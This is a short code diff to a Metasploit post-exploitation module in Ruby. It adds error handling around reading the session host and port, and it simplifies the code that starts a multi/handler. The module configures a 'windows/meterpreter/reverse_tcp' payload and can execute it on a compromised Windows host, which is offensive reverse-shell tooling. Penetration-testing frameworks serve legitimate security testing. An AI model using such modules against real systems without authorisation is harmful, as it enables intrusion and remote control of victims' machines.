@@ -104,8 +104,13 @@ class Metasploit3 < Msf::Post
 		startup = datastore['STARTUP']
 		template = datastore['TEMPLATE']
 		@clean_up_rc = ""
-		host,port = session.session_host, session.session_port
 		payload = "windows/meterpreter/reverse_tcp"
+		begin
+			host, port = session.session_host, session.session_port
+		rescue => e
+			print_error("Couldn't connect to session")
+			return nil
+		end
 
 		# Check user input
 		if action == 'MSF' or action == 'TEMPLATE'   # TEMPLATE - legacy
@@ -183,14 +188,8 @@ class Metasploit3 < Msf::Post
 			return
 		end
 
-		# Start handler (if set)
-		if handler
-			if lhost and lport
-				create_multihand(payload, lhost, lport)
-			else
-				print_error("Skipping multi/handler: LHOST/LPORT isn't set")
-			end
-		end
+		# Start handler if set
+		create_multihand(payload, lhost, lport) if handler
 
 		# Initial execution of payload (if set)
 		if exec
